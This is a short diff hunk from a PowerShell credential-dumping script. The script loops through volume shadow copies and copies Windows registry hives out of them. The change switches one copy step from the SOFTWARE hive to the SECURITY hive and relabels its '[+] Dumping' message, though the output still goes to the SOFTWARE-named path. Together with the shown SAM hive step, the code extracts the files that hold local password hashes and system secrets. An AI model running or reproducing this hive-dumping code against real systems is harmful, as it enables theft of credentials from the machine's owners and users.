@@ -52,8 +52,8 @@ for($i = 1; $i -le 9; $i++){
         Write-Host -ForegroundColor yellow "[+] " -NoNewline; Write-Host -ForegroundColor green "Dumping SAM$i hive..."
     } catch{}
     try{
-        [System.IO.File]::Copy(("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy" + $i + "\Windows\System32\config\software"), ($outSoft + $i))
-        Write-Host -ForegroundColor yellow "[+] " -NoNewline; Write-Host -ForegroundColor green "Dumping SOFTWARE$i hive..."
+        [System.IO.File]::Copy(("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy" + $i + "\Windows\System32\config\security"), ($outSoft + $i))
+        Write-Host -ForegroundColor yellow "[+] " -NoNewline; Write-Host -ForegroundColor green "Dumping SECURITY$i hive..."
     }
     catch{}
     try{
